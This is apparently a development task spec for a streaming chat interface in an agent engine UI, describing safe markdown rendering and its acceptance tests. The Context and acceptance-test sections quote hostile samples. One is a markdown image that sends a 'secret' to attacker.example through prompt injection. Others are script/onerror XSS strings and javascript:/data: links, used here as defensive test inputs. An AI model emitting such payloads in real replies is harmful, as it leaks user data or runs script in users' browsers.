# U-05. Chat with streaming

- **Lane:** U · **Module:** `apps/engine-ui` · **Milestone:** M2
- **Depends on:** U-02
- **Status:** todo
- **Spec:** Security hardening (5 agent output is untrusted, 6 tool calls never become code), Build plan (spike: SSE through the passthrough); ADRs: [0003](../../adr/0003-ui-as-signed-bundle.md)

## Goal

The owner can chat with any agent: replies stream in, can be stopped, render as safe markdown with highlighted code, and agent output can never cause a network request, run script or become an executable control.

## Context

Agent output is attacker-controlled the moment an agent reads a web page or a document (prompt injection). The spec's test for this task: an agent reply containing `![x](https://attacker.example/?d=secret)` causes no network request. CSP and Trusted Types are the backstop; the renderer must not rely on them. The predecessor chat (`promptbook`, `src/book-components/Chat`) may be ported (license gate lifted); port, then adapt it to the rules below. Anything it does with `innerHTML`, KaTeX from a CDN, iframes for citations or embeds, or rendering of raw HTML must go.

## Scope

- Routes: `/agents/$agentId/chat` (chat list plus a new-chat composer) and `/agents/$agentId/chat/$chatId`. The list shows every chat of the agent, including other members' and public visitors' chats (read-only for chats the owner did not start), with a source label. Whether the composer is shown is decided by `can('chats.write')` and whether the chat belongs to the current member, never by role name.
- Chat list: `DataTable` from `@ptbk/ui` in server-side mode (title or first message, source label, started by, last message time, message count), cursor and source filter in typed search params so the view is linkable; card layout below 768 px. Chat links preload the chat's first message page on intent.
- `ChatPanel` component (`src/features/chat/chat-panel.tsx`) reusable by U-04's test step: message list, composer, stop button, connection state. It stays in engine-ui; only its primitives come from `@ptbk/ui`.
- Streaming through the client port: `sendMessage(chatId, input, { signal })` returning an async iterable of typed events from C-04 (C-04's `ReplyStreamEvent`: `delta | completed | failed`). Stop aborts the iterable and calls C-04's `POST /chats/{chatId}/messages/{messageId}/cancel` with the reply's message ID (from the send response) so the engine stops generating. A dropped stream marks the message "interrupted", refetches the chat from the server and offers "Retry", which re-sends only on click. No polling: stream events drive the reducer, and the cache is updated from them (Design notes).
- Composer: `Textarea` from `@ptbk/ui`, Enter sends, Shift+Enter inserts a newline, disabled while a reply streams, `Esc` or the Stop button stops, length limit from the API. Sending appends the user message optimistically; if the send call fails, the message is removed, the text goes back into the composer and an error toast explains why.
- Message list: older messages load upward with `useInfiniteQuery` over the paged messages endpoint; long histories are virtualised with `@tanstack/react-virtual` 3.14.x (dynamic row measurement; declared in engine-ui at the exact version `@ptbk/ui` uses) above a threshold of about 200 messages, keeping scroll position when older pages arrive; auto-scroll while at the bottom; a "Jump to latest" button when the user has scrolled up; one `aria-live="polite"` announcement when a reply finishes (not per token).
- States: skeletons for the list and the message history, empty states (no chats yet; new chat), error states with retry, chat not found; the route error boundary catches the rest (U-02).
- Rendering (`src/features/chat/render/`):
  - User messages: plain text, whitespace preserved.
  - Agent messages while streaming: plain text. After `completed`: markdown, per the spec ("sanitised after the stream ends").
  - Markdown: `react-markdown` + `remark-gfm`, `skipHtml`, no `rehype-raw`. Raw HTML in the source shows as literal text. Allowed nodes: paragraphs, headings (rendered one level lower), emphasis, strong, strikethrough, lists, task lists (checkboxes disabled), blockquotes, tables, thematic breaks, inline code, code blocks, links.
  - Links: only absolute `http:`/`https:` URLs to another origin become `ExternalLink` with the full URL visible on hover and focus. `javascript:`, `data:`, `vbscript:`, `blob:`, `file:`, relative and same-origin URLs render as plain text. One function, `src/security/safe-url.ts`, decides.
  - Images: never an `<img>`. Rendered as text "Image: <alt> (<host>)", linked under the same URL rule.
  - Code blocks: highlighted with `@lezer/highlight` `highlightCode` and lazily loaded `@codemirror/lang-*` parsers (JavaScript/TypeScript, JSON, Python, shell, CSS, HTML, SQL, YAML, Markdown), emitted as React `<span>`s with `classHighlighter` classes. Unknown languages render unhighlighted. A `CopyButton` copies the text; nothing offers to run code.
  - Tool calls: not in C-04's `ReplyStreamEvent` yet (a possible future addition). When C-04 adds them, they render as a collapsed, non-interactive card with the tool name, status and arguments as escaped JSON text; not built in this task.

## Out of scope

- Attachments, voice, screencast. Math rendering (would need KaTeX CSS and fonts bundled locally; later).
- Editing or deleting messages. Agent book editing (U-04).

## Design notes

- No `dangerouslySetInnerHTML` and no HTML parsing anywhere in the pipeline, so the `ptbk-html` Trusted Types policy is not needed here. If a future need appears, create `src/security/trusted-html.ts` with DOMPurify (`RETURN_TRUSTED_TYPE`) as the only place allowed to produce HTML, and add a test for it.
- Streaming state lives in a reducer (`idle | streaming | stopping | done | interrupted | error`), not in the query cache; the final message is written to the cache with `setQueryData` on the chat's messages key on `completed`, so nothing refetches or polls. TanStack Query's streamed-query helper was considered and not used: stop, interrupted and retry need the reducer's states.
- Virtualisation breaks the browser's find-in-page for off-screen messages; that is why it starts only above the threshold.
- Tests drive the stream with a controllable async generator (resolve each event by hand), no timers or sleeps.

## Acceptance criteria

- [ ] Streaming test: deltas appear in order; markdown renders only after `completed`; the live region announces once.
- [ ] Stop test: aborts the iterable, calls the cancel endpoint once with the reply's message ID, keeps the partial text and marks it stopped; a second click does nothing.
- [ ] Dropped stream and `failed` event each show their state; Retry re-sends only on click.
- [ ] Hostile output tests (each asserts the DOM and that no `img`, `script`, `iframe` or `a[href]` with a forbidden scheme exists):
  - [ ] `![x](https://attacker.example/?d=secret)` renders no `<img>` and starts no request (spy on `fetch` and image loads);
  - [ ] `<script>alert(1)</script>` and `<img src=x onerror=alert(1)>` render as literal text;
  - [ ] `[click](javascript:alert(1))`, `[x](data:text/html,…)`, `[x](/v1/agents/1)` render as text without `href`;
  - [ ] `[docs](https://example.com/a)` renders an external link with `rel="noopener noreferrer"`.
- [ ] Code block test: a TypeScript block yields highlight spans; an unknown language renders as plain text; copy puts the exact text on the clipboard.
- [ ] `test:csp` sends a message against the in-memory client's scripted reply containing the hostile samples and records zero violations and zero non-`'self'` requests.
- [ ] Keyboard: send, newline, stop and jump-to-latest work without a mouse; `axe-core` passes.
- [ ] Optimistic send: a failed send removes the message, restores the composer text and shows an error toast.
- [ ] A chat with 2,000 seeded messages mounts only the visible window, loads older pages on scroll up without jumping, and jump-to-latest reaches the newest message.
- [ ] Chat list: source filter and cursor are written to the URL and restored on reload; empty, error and not-found states each have a test.
- [ ] `test:csp` passes the UX checks (360 px without overflow, layout shift, reduced motion) on the chat list and a chat; both routes stay within their bundle budgets (lazily loaded language parsers do not count toward the route).
- [ ] `bun run check` passes.
- [ ] **Status** line above set to `done (#<PR>)`.

## Risks and open points

- Rendering plain text until `completed` follows the spec literally but reflows the message at the end. Rendering markdown incrementally is equally safe here because no HTML is ever parsed; changing it needs a short ADR, not a silent deviation.
- C-04's chat list must cover chats from all sources (other members', public visitors') with a source label; amend the contract first if missing.
- Whether the client uses `EventSource` or `fetch` with a stream reader is a C-04 detail; the UI only sees the async iterable.
